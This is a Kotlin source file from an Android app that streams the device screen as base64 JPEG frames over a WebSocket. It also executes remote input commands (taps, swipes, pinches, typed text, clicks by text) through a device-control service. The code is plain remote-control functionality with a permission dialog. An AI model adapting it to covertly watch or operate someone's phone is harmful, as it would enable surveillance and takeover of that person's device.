package com.kashem.shaikh.streaming

import android.content.Context
import android.content.Intent
import android.util.Base64
import com.kashem.shaikh.services.AppLogs
import com.kashem.shaikh.services.ForegroundService
import com.kashem.shaikh.services.WebSocketClient
import org.json.JSONObject

object DeviceController {

    @Volatile private var screenCapture: ScreenCapture? = null
    @Volatile private var isRunning = false

    @Volatile private var screenWidth = 540
    @Volatile private var screenHeight = 960
    @Volatile private var realWidth = 1080
    @Volatile private var realHeight = 2400

    @Synchronized
    fun startWithPermission(context: Context, resultCode: Int, data: Intent?): String {
        if (isRunning) {
            AppLogs.info("DeviceController: already running")
            return "SUCCESS: Already running"
        }
        AppLogs.info("DeviceController: permission, resultCode=$resultCode, hasData=${data != null}")
        if (data == null) return "ERROR: No data from permission dialog"

        AppLogs.info("DeviceController: Step 1 – upgrading FGS type")
        if (!ForegroundService.upgradeToMediaProjection()) {
            AppLogs.error("DeviceController: FGS upgrade failed")
            return "ERROR: Failed to upgrade FGS type"
        }
        try { Thread.sleep(500) } catch (_: InterruptedException) {}

        AppLogs.info("DeviceController: Step 2 – creating ScreenCapture")
        return try {
            val capture = ScreenCapture(
                context = context,
                resultCode = resultCode,
                data = data,
                onFrame = { jpeg -> sendFrame(jpeg) },
                onRotation = { fw, fh, rw, rh -> handleRotation(fw, fh, rw, rh) }
            )

            if (!capture.start()) {
                AppLogs.error("ScreenCapture.start() returned false")
                try { ForegroundService.downgradeFromMediaProjection() } catch (_: Exception) {}
                return "ERROR: ScreenCapture start failed"
            }

            screenCapture = capture
            isRunning = true
            screenWidth = capture.screenWidth
            screenHeight = capture.screenHeight
            realWidth = capture.screenRealWidth
            realHeight = capture.screenRealHeight

            AppLogs.info(
                "DeviceController: frame=${screenWidth}x${screenHeight}, real=${realWidth}x${realHeight}"
            )

            try {
                WebSocketClient.sendRaw(JSONObject().apply {
                    put("type", "screen_info")
                    put("w", screenWidth)
                    put("h", screenHeight)
                    put("realW", realWidth)
                    put("realH", realHeight)
                }.toString())
            } catch (_: Exception) {}

            AppLogs.info(
                "DeviceController: ✅ started ${screenWidth}x${screenHeight} (real ${realWidth}x${realHeight})"
            )
            "SUCCESS: Controller started | Open browser: /controller"
        } catch (e: Exception) {
            AppLogs.error("DeviceController: ScreenCapture exception", e)
            try { ForegroundService.downgradeFromMediaProjection() } catch (_: Exception) {}
            "ERROR: ${e.message}"
        }
    }

    private fun handleRotation(fw: Int, fh: Int, rw: Int, rh: Int) {
        screenWidth = fw
        screenHeight = fh
        realWidth = rw
        realHeight = rh
        AppLogs.info("DeviceController: rotated → frame=${fw}x${fh}, real=${rw}x${rh}")
        try {
            WebSocketClient.sendRaw(JSONObject().apply {
                put("type", "screen_info")
                put("w", fw)
                put("h", fh)
                put("realW", rw)
                put("realH", rh)
                put("rotated", true)
            }.toString())
        } catch (_: Exception) {}
    }

    @Synchronized
    fun stop(): String {
        if (!isRunning) return "SUCCESS: Not running"
        isRunning = false
        try { screenCapture?.stop() } catch (_: Exception) {}
        screenCapture = null
        try { ForegroundService.downgradeFromMediaProjection() } catch (_: Exception) {}
        try {
            WebSocketClient.sendRaw(JSONObject().apply {
                put("type", "screen_info_stop")
            }.toString())
        } catch (_: Exception) {}
        AppLogs.info("DeviceController: stopped")
        return "SUCCESS: Controller stopped"
    }

    fun isRunning(): Boolean = isRunning

    private fun sendFrame(jpegBytes: ByteArray) {
        try {
            val b64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
            val json = JSONObject().apply {
                put("type", "screen_frame")
                put("data", b64)
                put("w", screenWidth)
                put("h", screenHeight)
            }
            WebSocketClient.sendRaw(json.toString())
        } catch (_: Exception) {}
    }

    fun handleInput(json: JSONObject): String {
        return try {
            // ✅ FIX: real dimensions validation
            if (realWidth <= 0 || realHeight <= 0) {
                return "ERROR: Screen dimensions not initialized"
            }

            val action = json.optString("action", "")

            fun px(key: String, fallback: Double = 0.0): Float =
                (json.optDouble(key, fallback) * realWidth).toFloat()
            fun py(key: String, fallback: Double = 0.0): Float =
                (json.optDouble(key, fallback) * realHeight).toFloat()

            when (action) {
                "tap" -> {
                    val x = px("x"); val y = py("y")
                    AppLogs.debug(
                        "tap: ratio=(${json.optDouble("x")},${json.optDouble("y")}) → " +
                        "px=($x,$y) real=${realWidth}x${realHeight}"
                    )
                    "tap($x,$y)=${DeviceControlService.tap(x, y)}"
                }
                "long_press" -> {
                    val x = px("x"); val y = py("y")
                    val d = json.optLong("duration", 800L)
                    AppLogs.debug("longPress: px=($x,$y) dur=$d")
                    "longPress($x,$y)=${DeviceControlService.longPress(x, y, d)}"
                }
                "swipe" -> {
                    val x1 = px("x");  val y1 = py("y")
                    val x2 = px("x2"); val y2 = py("y2")
                    val d = json.optLong("duration", 250L)
                    AppLogs.debug("swipe: ($x1,$y1)→($x2,$y2) dur=$d")
                    "swipe=${DeviceControlService.swipe(x1, y1, x2, y2, d)}"
                }
                "pinch" -> {
                    val cx = px("cx", 0.5)
                    val cy = py("cy", 0.5)
                    // ✅ FIX: radius ratio → pixels (px/py-এর মতোই)
                    val startR = (json.optDouble("startR", 0.1) * realWidth).toFloat()
                    val endR = (json.optDouble("endR", 0.3) * realWidth).toFloat()
                    "pinch=${DeviceControlService.pinch(cx, cy, startR, endR, 300L)}"
                }
                "global" -> {
                    val name = json.optString("name", "")
                    "global($name)=${DeviceControlService.globalAction(name)}"
                }
                "type_text" -> {
                    val text = json.optString("text", "")
                    "typeText=${DeviceControlService.typeText(text)}"
                }
                "click_by_text" -> {
                    val text = json.optString("text", "")
                    "clickByText($text)=${DeviceControlService.clickByText(text)}"
                }
                else -> "UNKNOWN_ACTION: $action"
            }
        } catch (e: Exception) {
            AppLogs.error("handleInput error", e)
            "ERROR: ${e.message}"
        }
    }
}